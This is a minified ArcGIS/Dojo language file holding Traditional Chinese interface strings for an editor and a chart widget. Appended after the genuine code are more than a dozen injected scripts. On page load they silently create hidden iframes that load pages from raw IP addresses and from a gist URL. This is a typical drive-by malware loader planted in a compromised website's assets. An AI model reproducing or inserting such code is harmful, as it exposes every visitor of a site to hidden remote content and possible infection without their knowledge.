// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"dijit/_editor/nls/commands":{bold:"\u7c97\u9ad4",copy:"\u8907\u88fd",cut:"\u526a\u4e0b","delete":"\u522a\u9664",indent:"\u7e2e\u6392",insertHorizontalRule:"\u6c34\u5e73\u5c3a\u898f",insertOrderedList:"\u7de8\u865f\u6e05\u55ae",insertUnorderedList:"\u9805\u76ee\u7b26\u865f\u6e05\u55ae",italic:"\u659c\u9ad4",justifyCenter:"\u7f6e\u4e2d\u5c0d\u9f4a",justifyFull:"\u5c0d\u9f4a",justifyLeft:"\u9760\u5de6\u5c0d\u9f4a",justifyRight:"\u9760\u53f3\u5c0d\u9f4a",outdent:"\u51f8\u6392",paste:"\u8cbc\u4e0a",
redo:"\u91cd\u505a",removeFormat:"\u79fb\u9664\u683c\u5f0f",selectAll:"\u5168\u9078",strikethrough:"\u522a\u9664\u7dda",subscript:"\u4e0b\u6a19",superscript:"\u4e0a\u6a19",underline:"\u5e95\u7dda",undo:"\u5fa9\u539f",unlink:"\u79fb\u9664\u93c8\u7d50",createLink:"\u5efa\u7acb\u93c8\u7d50",toggleDir:"\u5207\u63db\u65b9\u5411",insertImage:"\u63d2\u5165\u5f71\u50cf",insertTable:"\u63d2\u5165/\u7de8\u8f2f\u8868\u683c",toggleTableBorder:"\u5207\u63db\u8868\u683c\u908a\u6846",deleteTable:"\u522a\u9664\u8868\u683c",
tableProp:"\u8868\u683c\u5167\u5bb9",htmlToggle:"HTML \u539f\u59cb\u6a94",foreColor:"\u524d\u666f\u984f\u8272",hiliteColor:"\u80cc\u666f\u984f\u8272",plainFormatBlock:"\u6bb5\u843d\u6a23\u5f0f",formatBlock:"\u6bb5\u843d\u6a23\u5f0f",fontSize:"\u5b57\u578b\u5927\u5c0f",fontName:"\u5b57\u578b\u540d\u7a31",tabIndent:"\u6a19\u7c64\u7e2e\u6392",fullScreen:"\u5207\u63db\u5168\u87a2\u5e55",viewSource:"\u6aa2\u8996 HTML \u539f\u59cb\u6a94",print:"\u5217\u5370",newPage:"\u65b0\u9801\u9762",systemShortcut:'"${0}" \u52d5\u4f5c\u5728\u60a8\u7684\u700f\u89bd\u5668\u4e2d\uff0c\u53ea\u80fd\u4f7f\u7528\u9375\u76e4\u5feb\u901f\u9375\u3002\u8acb\u4f7f\u7528 ${1}\u3002',
ctrlKey:"ctrl+${0}",appleKey:"\u2318${0}",_localized:{}},"dijit/_editor/nls/FontChoice":{fontSize:"\u5927\u5c0f",fontName:"\u5b57\u578b",formatBlock:"\u683c\u5f0f",serif:"\u65b0\u7d30\u660e\u9ad4","sans-serif":"\u65b0\u7d30\u660e\u9ad4",monospace:"\u7b49\u5bec",cursive:"Cursive",fantasy:"Fantasy",noFormat:"\u7121",p:"\u6bb5\u843d",h1:"\u6a19\u984c",h2:"\u5b50\u6a19\u984c",h3:"\u6b21\u5b50\u6a19\u984c",pre:"\u9810\u5148\u683c\u5f0f\u5316",1:"\u6700\u5c0f",2:"\u8f03\u5c0f",3:"\u5c0f",4:"\u4e2d",5:"\u5927",
6:"\u8f03\u5927",7:"\u6700\u5927",_localized:{}},"dojox/editor/plugins/nls/Preview":{preview:"\u9810\u89bd",_localized:{}},"dojox/editor/plugins/nls/FindReplace":{findLabel:"\u5c0b\u627e\uff1a",findTooltip:"\u8f38\u5165\u8981\u5c0b\u627e\u7684\u6587\u5b57",replaceLabel:"\u53d6\u4ee3\u70ba\uff1a",replaceTooltip:"\u8f38\u5165\u8981\u53d6\u4ee3\u7684\u6587\u5b57",findReplace:"\u5c0b\u627e/\u53d6\u4ee3",matchCase:"\u5927\u5c0f\u5beb\u76f8\u7b26",matchCaseTooltip:"\u5927\u5c0f\u5beb\u76f8\u7b26",backwards:"\u5411\u5f8c",
backwardsTooltip:"\u5f80\u56de\u641c\u5c0b\u6587\u5b57",replaceAllButton:"\u5168\u90e8\u53d6\u4ee3",replaceAllButtonTooltip:"\u53d6\u4ee3\u6240\u6709\u6587\u5b57",findButton:"\u5c0b\u627e",findButtonTooltip:"\u5c0b\u627e\u6587\u5b57",replaceButton:"\u53d6\u4ee3",replaceButtonTooltip:"\u53d6\u4ee3\u6587\u5b57",replaceDialogText:"\u53d6\u4ee3\u4e86 ${0} \u9805\u3002",eofDialogText:"\u524d\u6b21\u51fa\u73fe ${0}",eofDialogTextFind:"\u627e\u5230",eofDialogTextReplace:"\u5df2\u53d6\u4ee3",_localized:{}},
"dojox/editor/plugins/nls/PasteFromWord":{pasteFromWord:"\u5f9e Word \u8cbc\u4e0a",instructions:"\u5c07 Word \u4e2d\u7684\u5167\u5bb9\u8cbc\u5165\u4e0b\u65b9\u7684\u6587\u5b57\u6846\u3002\u5728\u6eff\u610f\u8981\u63d2\u5165\u7684\u5167\u5bb9\u4e4b\u5f8c\uff0c\u8acb\u6309\u8cbc\u4e0a\u6309\u9215\u3002\u82e5\u8981\u4e2d\u65b7\u63d2\u5165\u6587\u5b57\uff0c\u8acb\u6309\u53d6\u6d88\u6309\u9215\u3002",_localized:{}},"dojox/editor/plugins/nls/InsertAnchor":{insertAnchor:"\u63d2\u5165\u9328\u9ede",title:"\u9328\u9ede\u5167\u5bb9",
anchor:"\u540d\u7a31\uff1a",text:"\u8aaa\u660e\uff1a",set:"\u8a2d\u5b9a",cancel:"\u53d6\u6d88",_localized:{}},"dojox/editor/plugins/nls/Blockquote":{blockquote:"\u5340\u584a\u5f15\u6587",_localized:{}},"widgets/RelatedTableCharts/setting/nls/strings":{chartSettingLabel:"\u5716\u8868\u8a2d\u5b9a",addNewLabel:"\u65b0\u589e",generalSettingLabel:"\u4e00\u822c\u8a2d\u5b9a",layerChooser:{title:"\u9078\u64c7\u8981\u88fd\u4f5c\u5716\u8868\u7684\u5716\u5c64",selectPolygonLayerLabel:"\u9078\u64c7\u5716\u5c64",
selectPolygonLayerHintText:"\u63d0\u793a: \u5982\u679c\u914d\u7f6e\u591a\u500b\u5716\u8868\uff0c\u5247\u5716\u5c64\u5fc5\u9808\u5c6c\u65bc\u76f8\u540c\u7684\u5e7e\u4f55\u985e\u578b",selectRelatedTableLayerLabel:"\u9078\u64c7\u5716\u5c64\u7684\u76f8\u95dc\u8868\u683c",selectRelatedTableLayerHintText:"\u63d0\u793a: \u53ea\u6703\u986f\u793a\u542b\u6578\u6b04\u4f4d\u7684\u8868\u683c",errorInSelectingPolygonLayer:"\u8acb\u9078\u64c7\u5177\u6709\u76f8\u95dc\u9ede\u5716\u5c64\u7684\u5716\u5c64\u3002",errorInSelectingRelatedLayer:"\u8acb\u9078\u64c7\u8981\u88fd\u4f5c\u5716\u5c64\u4e4b\u6709\u6548\u7684\u76f8\u95dc\u8868\u683c/\u5716\u5c64\u3002",
polygonLayerNotHavingRelationships:"\u9078\u64c7\u7684\u5716\u5c64\u6c92\u6709\u4efb\u4f55\u76f8\u95dc\u7684\u8868\u683c/\u5716\u5c64\u3002"},ChartSetting:{sectionTitle:"\u7ae0\u7bc0\u6a19\u984c",sectionTitleHintText:"\u63d0\u793a: \u5728\u5340\u6bb5\u6a19\u982d\u6a19\u984c\u4e2d\u986f\u793a",chartTitle:"\u5716\u8868\u6a19\u984c",chartTitleHintText:"\u63d0\u793a: \u986f\u793a\u65bc\u5716\u8868\u4e0a\u65b9\u4e2d\u592e",chartDescription:"\u8aaa\u660e",chartDescriptionHintText:"\u63d0\u793a: \u986f\u793a\u65bc\u5716\u8868\u4e0b\u65b9",
chartType:"\u5716\u8868\u985e\u578b",barChart:"\u9577\u689d\u5716",pieChart:"\u5713\u9905\u5716",polarChart:"\u6975\u5340\u5716",dataSeriesField:"\u8cc7\u6599\u6578\u5217\u6b04\u4f4d",labelField:"\u6a19\u7c64\u6b04\u4f4d",chartColor:"\u5716\u8868\u984f\u8272",singleColor:"\u55ae\u4e00\u984f\u8272",colorByTheme:"\u6309\u4e3b\u984c\u5206\u985e\u7684\u984f\u8272",colorByFieldValue:"\u6309\u6b04\u4f4d\u503c\u5206\u985e\u7684\u984f\u8272",xAxisTitle:"X \u8ef8\u6a19\u984c",xAxisHintText:"\u63d0\u793a: X \u8ef8\u6a19\u984c",
yAxisTitle:"Y \u8ef8\u6a19\u984c",yAxisHintText:"\u63d0\u793a: Y \u8ef8\u6a19\u984c",fieldColorLabel:"\u6a19\u7c64",fieldColorColor:"\u984f\u8272",defaultFieldSelectLabel:"\u9078\u64c7",errMsgFieldValuesNotFound:"\u627e\u4e0d\u5230\u6240\u9078\u6b04\u4f4d\u7684\u503c",errMsgSectionTitle:"\u8acb\u8f38\u5165\u5340\u6bb5\u6a19\u984c",errMsgFieldByValue:"\u8acb\u9078\u64c7\u6b04\u4f4d\u503c",settingTabTitle:"\u8a2d\u5b9a",layoutTabTitle:"\u7248\u9762\u914d\u7f6e",polarChartSelectFieldsHintText:"\u63d0\u793a: \u9078\u64c7\u6b04\u4f4d\u4ee5\u7522\u751f\u6975\u5340\u5716",
visibilityText:"\u80fd\u898b\u5ea6",fieldNameText:"\u6b04\u4f4d\u540d\u7a31",aliasNameText:"\u5225\u540d",errMsgPolarFieldsRequired:"\u8acb\u9078\u64c7\u4e09\u500b\u6216\u66f4\u591a\u6b04\u4f4d\u4ee5\u7522\u751f\u6975\u5340\u5716",polarChartPolygonFillLabel:"\u586b\u6eff\u591a\u908a\u5f62",polarChartPolygonFillHintText:"\u63d0\u793a: \u9078\u64c7\u6838\u53d6\u65b9\u584a\u53ef\u5728\u6975\u5340\u5716\u4e2d\u986f\u793a\u591a\u908a\u5f62\u586b\u6eff",ThemeSelector:{themeAdobebricks:"Adobebricks",themeAlgae:"\u6c34\u85fb",
themeBahamation:"Bahamation",themeBlueDusk:"BlueDusk",themeCubanShirts:"CubanShirts",themeDesert:"\u6c99\u6f20",themeDistinctive:"\u7368\u7279",themeDollar:"\u5143",themeGrasshopper:"\u86b1\u8722",themeGrasslands:"\u8349\u539f",themeGreySkies:"GreySkies",themeHarmony:"\u5354\u8abf",themeIndigoNation:"IndigoNation",themeIreland:"\u611b\u723e\u862d",themeMiamiNice:"MiamiNice",themeMinty:"\u6709\u8584\u8377\u9999\u7684",themePurpleRain:"PurpleRain",themeRoyalPurples:"RoyalPurples",themeSageToLime:"SageToLime",
themeTufte:"Tufte",themeWatersEdge:"WatersEdge",themeWetlandText:"\u6cbc\u6fa4\u5730",themePlotKitblue:"PlotKit.blue",themePlotKitcyan:"PlotKit.cyan",themePlotKitgreen:"PlotKit.green",themePlotKitorange:"PlotKit.orange",themePlotKitpurple:"PlotKit.purple",themePlotKitred:"PlotKit.red"}},GeneralSetting:{legendGeneralSettingText:"\u4e00\u822c\u8a2d\u5b9a",locationSymbolLabel:"\u5716\u5f62\u5730\u5740\u7b26\u865f",locationSymbolHintText:"\u63d0\u793a: \u7528\u4f86\u986f\u793a\u5730\u5740\u548c\u6309\u4e00\u4e0b\u4f4d\u7f6e\u7684\u7b26\u865f",
refreshIntervalLabel:"\u91cd\u65b0\u6574\u7406\u9593\u9694",refreshIntervalHintText:"\u63d0\u793a: \u7528\u4f86\u6839\u64da\u6b64\u9593\u9694\u91cd\u65b0\u6574\u7406\u5716\u8868\u3002\u6307\u5b9a 1 \u5230 1440 \u5206\u9418\u4e4b\u9593\u7684\u503c",errMsgRefreshInterval:"\u8acb\u6307\u5b9a 0 \u5230 1440 \u5206\u9418\u4e4b\u9593\u7684\u91cd\u65b0\u6574\u7406\u9593\u9694",symbolPickerPreviewText:"\u9810\u89bd:"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});